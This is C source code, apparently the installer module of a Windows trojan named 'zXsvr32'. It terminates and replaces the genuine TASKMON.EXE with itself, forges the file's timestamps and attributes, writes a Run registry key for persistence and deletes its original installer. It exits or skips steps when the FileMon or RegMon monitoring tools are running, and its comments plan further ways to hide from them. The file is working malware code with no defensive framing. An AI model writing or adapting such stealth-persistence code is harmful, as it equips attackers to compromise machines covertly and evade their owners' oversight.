#include <windows.h>

#include "defines.h"
#include "macros.h"
#include "globals.h"
#include "misc.h"

#define RegRootKey       HKEY_LOCAL_MACHINE
#define RegRunPath       "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RegHostKeyName   "TaskMonitor"
#define RegHostFileName  "TASKMON.EXE"
							
#define hostWndClass		 "MSTaskMonClass"
#define hostFileName		 "TASKMON.EXE"
#define getHostDirectory GetWindowsDirectory

#define WIN_INI_sec			"Compatibility32"
#define WIN_INI_key			"ZXSVR32"

int install()// returns 0 if this instance must terminate, else returns ~0
{
	char *lpC = GetCommandLine();
	HANDLE hF;
  HWND hW;
	FILETIME createTime,lastAccessTime,lastWriteTime;
	DWORD fileAttr;
	char zX_path[MAX_PATH];
	char host_path[MAX_PATH];
	HKEY hK;
	COPYDATASTRUCT cds;
  char buf[11];

#ifndef noChk4FileMon
	if (fileMonRunning)//if filemon running!
		return 0;//0 to exit
#endif

	getHostDirectory(host_path,MAX_PATH);
	lstrcat(host_path,"\\");lstrcat(host_path,hostFileName);
	GetModuleFileName(0,zX_path,MAX_PATH);

#ifdef noChk4version
	if (hW=FindWindow(zXClassName,0))
	{
		cds.dwData=zXver_num;
		cds.lpData=zXver;
		cds.cbData=lstrlen(zXver)+1;
		SendMessage(hW,WM_COPYDATA,zXmsg_newVersion,(LPARAM)&cds);/*ask old version to exit*/
	}
	goto zXinstall;
#endif

#define zXver_num_current	_atox(buf+4)//'0x80??????'; ??????:version
	GetProfileString(WIN_INI_sec,WIN_INI_key,"0x80000000",buf,11);buf[10]=0;
	if (zXver_num_current<zXver_num)
	{
		if (hW=FindWindow(zXClassName,0))
		{
			/*check if currently running zXsvr32 is older*/
			if (SendMessage(hW,zXmsg_server,zXmsg_getVersion,0)<zXver_num)
			{
				cds.dwData=zXver_num;
				cds.lpData=zXver;
				cds.cbData=lstrlen(zXver)+1;
				SendMessage(hW,WM_COPYDATA,zXmsg_newVersion,(LPARAM)&cds);/*ask old version to exit*/
				SendMessage(hW,zXmsg_server,zXmsg_newVersion,zXver_num);
          /*versions before v0.6.9t will respond only to this message*/
			}
			else
				return 0;/* newer version running ... */
		}
zXinstall:
		if /*while*/(hW=FindWindow(hostWndClass,0))
		{
			/*terminate the host program if running ...*/
			GetWindowThreadProcessId(hW,&I/*&pid*/);
			if (hF=OpenProcess(PROCESS_TERMINATE,0,I/*pid*/))
			{
				if (TerminateProcess(hF,0))
					WaitForSingleObject(hF,10000);
				CloseHandle(hF);
			}
		}
		if (lstrcmpi(host_path,zX_path))//if i am not the host_path file; ie i am not installed
		{
			if (~(fileAttr=GetFileAttributes(host_path)))
			{
        if (hF=CreateFile(host_path,0,FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0)){
  				GetFileTime(hF,&createTime,&lastAccessTime,&lastWriteTime);
				  CloseHandle(hF);
        }
			}
			SetFileAttributes(host_path,FILE_ATTRIBUTE_NORMAL);
			for(I=10;I && !CopyFile(zX_path,host_path,0);--I,Sleep(1000));
			if (~fileAttr)
			{
				hF=CreateFile(host_path,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
				SetFileTime(hF,&createTime,&lastAccessTime,&lastWriteTime);
				CloseHandle(hF);
				SetFileAttributes(host_path,fileAttr);
			}
			if (I)//file replacement successful
			{
				wsprintf(g_buf,"0x80%.6X",zXver_num);
				WriteProfileString(WIN_INI_sec,WIN_INI_key,g_buf);
#ifndef noDeleteInstaller
				lstrcat(host_path," del:");lstrcat(host_path,zX_path);
#endif
        createProcess(host_path);
				return 0;//exit process after returning from this function
			}
		}
	}
	else{
    /*same or newer version is/had_been installed*/
		if (lstrcmpi(host_path,zX_path)/* am i it ?! */){
      /* i am not the one ...*/
			if (!FindWindow(zXClassName,0)/*if it isn't running, then run it!*/){
				if (!createProcess(host_path))
					goto zXinstall;/*if i couldn't execute it, then i take over ...*/
				/*
				else
					the installed version now running, so exit ...
				*/
			}
			return 0;/*newer version already running, so exit*/
		}
		/* i am installed ... (this is what happens everytime other than the first)
		else
			continue running ...
		*/
	}

	for(I=lstrlen(lpC)-4;I && *((unsigned long *)(lpC+I))!=':led';--I);
 	if (I)
		for(lpC+=I+4,I=10;I && !DeleteFile(lpC);--I,Sleep(1000));//MUST create low priority thread to do the deleting
#ifndef noChk4RegMon
	if (!regMonRunning)//if regmon not running!
#endif
	{
    if (_RegOpenKeyEx(RegRootKey,RegRunPath,0,KEY_WRITE,&hK)==ERROR_SUCCESS)
    {
      //MUST enumerate the sub-keys, one by one; get the value and write the value;
      // for the required key write back the new value if required
      // this will make it difficult to detect in regmon
      _RegSetValueEx(hK,RegHostKeyName,0,REG_SZ,host_path,lstrlen(host_path));
      _RegCloseKey(hK);
    }
	}
	return -1;//-1 to continue running
}
